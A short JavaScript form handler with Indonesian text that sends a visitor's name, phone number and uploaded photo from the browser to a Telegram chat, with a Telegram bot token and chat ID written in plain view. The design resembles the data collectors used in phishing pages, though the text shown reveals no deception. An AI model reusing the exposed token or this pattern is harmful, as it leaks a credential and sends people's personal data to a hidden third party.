const BOT_TOKEN = "7340359614:AAFXHvoBGPrp_q7ZWXRZP3qaybhvq9gntTw";
const CHAT_ID = "6466187930";

// Tanggal otomatis
document.getElementById("tanggal").value = new Date().toLocaleDateString("id-ID");

const form = document.getElementById("glofyForm");
const imageInput = document.getElementById("imageUpload");

form.addEventListener("submit", function(e) {
  e.preventDefault();

  const nama = form.nama.value;
  const telepon = form.telepon.value;

  // Kirim info dulu
  fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
    method: "POST",
    headers: {
      "Content-Type": "application/json"
    },
    body: JSON.stringify({
      chat_id: CHAT_ID,
      text: `DATA GLOFY\nNama: ${nama}\nTelepon: ${telepon}\nTanggal: ${new Date().toLocaleDateString()}`
    })
  });

  // Kirim gambar ke bot
  const file = imageInput.files[0];
  const formData = new FormData();
  formData.append("chat_id", CHAT_ID);
  formData.append("photo", file);

  fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
    method: "POST",
    body: formData
  })
  .then(() => alert("Data berhasil dikirim. Terima kasih!"))
  .catch(err => alert("Gagal kirim gambar. Coba lagi."));
});
